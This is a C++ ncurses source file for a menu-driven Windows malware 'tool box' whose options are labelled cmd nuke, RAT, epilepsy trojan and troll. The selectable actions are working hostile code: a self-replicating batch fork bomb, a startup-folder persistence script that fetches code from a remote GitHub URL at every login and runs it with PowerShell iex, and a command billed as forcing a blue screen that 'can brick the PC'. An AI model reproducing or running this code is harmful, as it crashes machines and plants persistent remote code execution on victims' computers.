#include <stdio.h>
#include <iostream>
#include <ncurses.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>

int main(){

    initscr();
    cbreak();
    noecho();
    curs_set(0);
    nodelay(stdscr, TRUE);
    keypad(stdscr, TRUE);

    int bannerY=15;
    int option=1;
    int menu=0;


    int ch;

    while (1==1)
    {
        

        ch = getch();


        // INPUT

        if(ch==27){//escape
            break;
        }

        if(ch==KEY_UP && option != 1){
            option--;
        }
        if(ch==KEY_DOWN){
            option++;
        }


        if(menu==0){
            if(ch=='\n' && option==1){
                menu=1;
                option=1;
            }

            if(ch=='\n' && option==2){
                menu=2;
                option=1;
            }
            if(ch=='\n' && option==3){
                menu=3;
                option=1;
            }
            if(ch=='\n' && option==4){
                menu=4;
                option=1;
            }
            if(ch=='\n' && option==5){
                break;
            }
            
        }


        else if (menu==1){

            if(ch=='\n' && option==1){
                menu=0;
                
                system("echo x: > 1.bat");
                system("echo start 1.bat >> 1.bat");
                system("echo start 1.bat >> 1.bat");
                system("echo start 1.bat >> 1.bat");
                system("echo goto x >> 1.bat");
                system("start 1.bat");
                option=1;
            }
            else if(ch=='\n' && option==2){
                menu=0;
                option=1;
                std::cout << "ERROR!\n";        // INSERT COMMAND HERE
            }
            else if(ch=='\n' && option==3){
                menu=0;
                option=1;
            }
        }
        else if (menu==2){

            if(ch=='\n' && option==1){
                menu=0;
                
                system("powershell -Command \"$startup = [Environment]::GetFolderPath('Startup'); $content = 'powershell -Command \\\"iex (Invoke-WebRequest ''https://raw.githubusercontent.com/rickastley10/fetch/refs/heads/main/fetch.py'').Content\\\"'; Set-Content -Path (Join-Path $startup 'init.bat') -Value $content\"");
                option=1;
            }
            else if(ch=='\n' && option==2){
                menu=0;
                option=1;
            }
        }
        
        else if (menu==3){

            if(ch=='\n' && option==1){
                menu=0;
                option=1;
            }
            else if(ch=='\n' && option==2){
                menu=0;
                option=1;
            }
        }


        else if (menu==4){

            if(ch=='\n' && option==1){

                system("powershell wininit");
                menu=0;
                option=1;
            }
            else if(ch=='\n' && option==2){
                menu=0;
                option=1;
            }
        }


        
            

        // LOGIC

        if(bannerY!=1){
            bannerY--;
        }

        

        // RENDER
        
        if(menu==0){

            if(option==1){  mvprintw(11, 3, " [ * ]  1 => {START CMD NUKE}");}
            else{           mvprintw(11, 3, "[ - ]  1 => {start cmd nuke}");}

            if(option==2){  mvprintw(12, 3, " [ * ]  2 => {RAT}");}
            else{           mvprintw(12, 3, "[ - ]  2 => {rat}");}

            if(option==3){  mvprintw(13, 3, " [ * ]  3 => {EPILEPSY TROJAN}");}
            else{           mvprintw(13, 3, "[ - ]  3 => {epilepsy trojan}");}

            if(option==4){  mvprintw(14, 3, " [ * ]  4 => {TROLL}");}
            else{           mvprintw(14, 3, "[ - ]  4 => {troll}");}

            if(option==5){  mvprintw(15, 3, " [ * ]  5 => {EXIT}");}
            else{           mvprintw(15, 3, "[ - ]  5 => {exit}");}

        }


        else if(menu==1){
            if(option==1){  mvprintw(11, 3, " [ * ]  1 => continue with {cmd nuke} (WARNING, last chance)");}
            else{           mvprintw(11, 3, "[ - ]  1 => continue with {cmd nuke} (WARNING, last chance)");}

            if(option==2){  mvprintw(12, 3, " [ * ]  1 => continue with {cmd nuke TROJAN} (WARNING, last chance)");}
            else{           mvprintw(12, 3, "[ - ]  1 => continue with {cmd nuke TROJAN} (WARNING, last chance)");}

            if(option==3){  mvprintw(13, 3, " [ * ]  2 => back");}
            else{           mvprintw(13, 3, "[ - ]  2 => back");}
        }

        else if(menu == 2){
            if(option==1){  mvprintw(11, 3, " [ * ]  1 => continue with {RAT} (WARNING, last chance)");}
            else{           mvprintw(11, 3, "[ - ]  1 => continue with {RAT} (WARNING, last chance)");}

            if(option==2){  mvprintw(12, 3, " [ * ]  2 => back");}
            else{           mvprintw(12, 3, "[ - ]  2 => back");}
        }

        else if(menu == 3){
            if(option==1){  mvprintw(11, 3, " [ * ]  1 => continue with {epilepsy trojan} (WARNING, last chance)");}
            else{           mvprintw(11, 3, "[ - ]  1 => continue with {epilepsy trojan} (WARNING, last chance)");}

            if(option==2){  mvprintw(12, 3, " [ * ]  2 => back");}
            else{           mvprintw(12, 3, "[ - ]  2 => back");}
        }

        else if(menu == 4){
            if(option==1){  mvprintw(11, 3, " [ * ]  1 => continue with -=BSOD=- (WARNING, can brick the PC)");}
            else{           mvprintw(11, 3, "[ - ]  1 => continue with   bsod   (WARNING, can brick the PC)");}

            if(option==2){  mvprintw(12, 3, " [ * ]  2 => back");}
            else{           mvprintw(12, 3, "[ - ]  2 => back");}
        }



        
        


        mvprintw(bannerY, 10, "\'########::\'#######:::\'#######::\'##::::::::::\'########:::\'#######::\'##::::\'##:");
        mvprintw(bannerY+1, 10, "... ##..::\'##.... ##:\'##.... ##: ##:::::::::: ##.... ##:\'##.... ##:. ##::\'##::");
        mvprintw(bannerY+2, 10, "::: ##:::: ##:::: ##: ##:::: ##: ##:::::::::: ##:::: ##: ##:::: ##::. ##\'##:::");
        mvprintw(bannerY+3, 10, "::: ##:::: ##:::: ##: ##:::: ##: ##:::::::::: ########:: ##:::: ##:::. ###::::");
        mvprintw(bannerY+4, 10, "::: ##:::: ##:::: ##: ##:::: ##: ##:::::::::: ##.... ##: ##:::: ##::: ## ##:::");
        mvprintw(bannerY+5, 10, "::: ##:::: ##:::: ##: ##:::: ##: ##:::::::::: ##:::: ##: ##:::: ##:: ##:. ##::");
        mvprintw(bannerY+6, 10, "::: ##::::. #######::. #######:: ########:::: ########::. #######:: ##:::. ##:");
        mvprintw(bannerY+7, 10, ":::..::::::.......::::.......:::........:::::........::::.......:::..:::::..::");


        

        refresh();
        napms(100);

        clear();
    }
    

    getch();
    endwin();

    return 0;
}
